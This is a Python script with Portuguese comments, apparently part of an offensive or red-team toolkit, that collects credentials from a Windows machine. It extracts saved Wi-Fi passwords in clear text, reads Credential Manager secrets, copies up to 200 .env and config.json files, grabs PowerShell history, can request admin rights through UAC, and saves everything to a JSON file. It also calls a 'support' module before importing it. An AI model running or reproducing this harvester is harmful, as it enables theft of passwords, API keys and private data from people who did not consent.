import subprocess
import os
import json
import re
import ctypes
import sys
import argparse
from datetime import datetime

# Função para executar comandos do PowerShell
def run_ps(cmd):
    return subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd], capture_output=True, text=True)

# Função para extrair senhas de Wi-Fi
def get_wifi_passwords():
    try:
        output = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8", errors="ignore")
        profiles = re.findall(r"(?:Perfil de todos os usuários|All User Profile)\s*:\s*(.*)", output)
        wifi_passwords = {}
        for profile in profiles:
            try:
                cmd = ["netsh", "wlan", "show", "profile", f'name="{profile}"', "key=clear"]
                out2 = subprocess.check_output(cmd).decode("utf-8", errors="ignore")
                password = re.findall(r"(?:Conteúdo da Chave|Key Content)\s*:\s*(.*)", out2)
                if password:
                    wifi_passwords[profile] = password[0]
            except Exception:
                pass
        return wifi_passwords
    except Exception:
        return {}

# Função para extrair informações do Credential Manager
def get_credential_manager():
    try:
        import win32cred
        creds = win32cred.CredEnumerate(None, 0)
        credential_manager = {}
        for cred in creds:
            if cred['Type'] == win32cred.CRED_TYPE_GENERIC:
                credential_manager[cred['TargetName']] = cred['CredentialBlob'].decode('utf-16')
        return credential_manager
    except Exception:
        try:
            out = subprocess.check_output(["cmdkey", "/list"]).decode("utf-8", errors="ignore")
            targets = re.findall(r"(?:Target|Alvo)\s*:\s*(.+)", out)
            return {t.strip(): "" for t in targets}
        except Exception:
            return {}

# Função para extrair informações de arquivos de configuração
def get_config_files():
    try:
        config_files = {}
        home = os.path.expanduser("~")
        roots = []
        roots.append(os.getcwd())
        roots.append(home)
        roots.append(os.path.join(home, "Documents"))
        roots.append(os.path.join(home, "Desktop"))
        seen = 0
        for base in roots:
            if not os.path.isdir(base):
                continue
            for root, dirs, files in os.walk(base):
                for file in files:
                    if file.endswith(".env") or file.endswith("config.json"):
                        try:
                            p = os.path.join(root, file)
                            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                                config_files[p] = f.read()
                        except Exception:
                            pass
                        seen += 1
                        if seen >= 200:
                            return config_files
        return config_files
    except Exception:
        return {}

# Função para extrair histórico do PowerShell
def get_powershell_history():
    try:
        history_file = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
        with open(history_file, "r") as f:
            return f.read()
    except Exception:
        return ""

# Função para verificar se é administrador
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def run_as_admin(enable):
    if enable and not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

if __name__ == "__main__":
    support.ensure_dependencies(["pywin32"])
    p = argparse.ArgumentParser(description="Coleta credenciais e histórico, salva em JSON.")
    p.add_argument("--output", help="Arquivo de saída JSON", default=None)
    p.add_argument("--elevate", action="store_true", help="Executa com privilégios de administrador (UAC).")
    args = p.parse_args()

    run_as_admin(args.elevate)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    from support import results_dir
    out_dir = results_dir("credentials")
    default_out = args.output or os.path.join(out_dir, f"credentials_{ts}.json")

    data = {
        "timestamp": ts,
        "wifi_passwords": get_wifi_passwords(),
        "credential_manager": get_credential_manager(),
        "config_files": get_config_files(),
        "powershell_history": get_powershell_history(),
        "meta": {
            "is_admin": is_admin()
        }
    }
    try:
        with open(default_out, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        print(f"Resultados salvos em {default_out}")
    except Exception as e:
        print(f"Erro ao salvar arquivo: {e}")
